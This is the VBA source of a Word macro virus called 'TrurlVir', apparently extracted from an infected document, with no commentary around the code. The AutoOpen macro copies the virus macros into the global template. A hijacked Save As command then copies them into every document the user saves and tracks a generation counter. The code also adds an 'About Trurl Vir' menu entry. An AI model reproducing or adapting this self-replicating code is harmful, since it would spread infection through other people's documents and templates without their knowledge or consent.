   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "XArchivoGuardarComo"

   Public Sub main()
   Dim szHost$

       On Error GoTo -1: On Error GoTo abort

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg

       If dlg.Format = 0 Then
           dlg.Format = 1
       End If

       szHost$ = WordBasic.[FileName$]()
       WordBasic.Call "XCode.Infect", szHost$
       WordBasic.Call "XCode.SetGenCount"

       WordBasic.FileSaveAs dlg

   abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub main()
   Dim fSafeToGoRes$
       On Error GoTo -1: On Error GoTo abort

       fSafeToGoRes$ = WordBasic.Call("XCode.VerifyRes$")
       If fSafeToGoRes$ = "TRUE" Then
           WordBasic.Call "XCode.GoRes"
       End If

       WordBasic.Call "XCode.RetrieveGenCount"
       WordBasic.Call "XCode.SetupNewMenuItem"
   abort:
   End Sub

   Attribute VB_Name = "XCode"

   Public Sub main()
   Dim szGenCount$
       szGenCount$ = WordBasic.[GetProfileString$]("TrurlVir", "GenCount")
       WordBasic.MsgBox "Generation nr. " + szGenCount$, "About TrurlVir"
   End Sub

   Private Function VerifyRes$()
   Dim nMacroCount
   Dim i
   Dim szCurMacroName$
       On Error GoTo -1: On Error GoTo abort
       VerifyRes$ = "TRUE"
       nMacroCount = WordBasic.CountMacros()
       For i = 0 To nMacroCount
           szCurMacroName$ = WordBasic.[MacroName$](i)
           If szCurMacroName$ = "XCode" Then
               VerifyRes$ = "FALSE"
               GoTo return_
           End If
       Next i
   return_:
       GoTo Endit
   abort:
       VerifyRes$ = "FALSE"
   Endit:
   End Function

   Private Sub GoRes()
   Dim szFileName$
       On Error GoTo -1: On Error GoTo abort
       szFileName$ = WordBasic.[FileName$]()
       WordBasic.MacroCopy szFileName$ + ":AutoOpen", "Global:XAutoOpen"
       WordBasic.MacroCopy szFileName$ + ":XArchivoGuardarComo", "Global:ArchivoGuardarComo"
       WordBasic.MacroCopy szFileName$ + ":XCode", "Global:XCode"
   abort:
   End Sub

   Private Sub Infect(szHost$)
       WordBasic.MacroCopy "Global:XAutoOpen", szHost$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:ArchivoGuardarComo", szHost$ + ":XArchivoGuardarComo"
       WordBasic.MacroCopy "Global:XCode", szHost$ + ":XCode"
   End Sub

   Private Sub RetrieveGenCount()
   Dim szGenCount$
       szGenCount$ = WordBasic.[GetDocumentVar$]("VirGenCounter")
       WordBasic.SetProfileString "TrurlVir", "GenCount", szGenCount$
   End Sub

   Private Sub SetGenCount()
   Dim szGenCount$
   Dim nGenCount
       szGenCount$ = WordBasic.[GetProfileString$]("TrurlVir", "GenCount")
       nGenCount = WordBasic.Val(szGenCount$)
       nGenCount = nGenCount + 1
       WordBasic.SetDocumentVar "VirGenCounter", Str(nGenCount)
   End Sub

   Private Sub SetupNewMenuItem()
       WordBasic.ToolsCustomizeMenus _
           Category:=2, _
           Name:="XCode", _
           MenuType:=0, _
           Menu:="?", _
           MenuText:="Acerca de Trurl Vir", _
           AddBelow:="Acerca de Microsoft Word", _
           Context:=0, Add:=1
   End Sub

   Private Sub SetMacro(nScope, szMacro$, flag$)
       On Error GoTo -1: On Error GoTo abort
       If flag$ = "SET" Then
           WordBasic.ToolsMacro _
               Show:=nScope, _
               Name:="X" + szMacro$, _
               Rename:=1, _
               NewName:=szMacro$
       Else
           WordBasic.ToolsMacro _
               Show:=nScope, _
               Name:=szMacro$, _
               Rename:=1, _
               NewName:="X" + szMacro$
       End If
   abort:
   End Sub
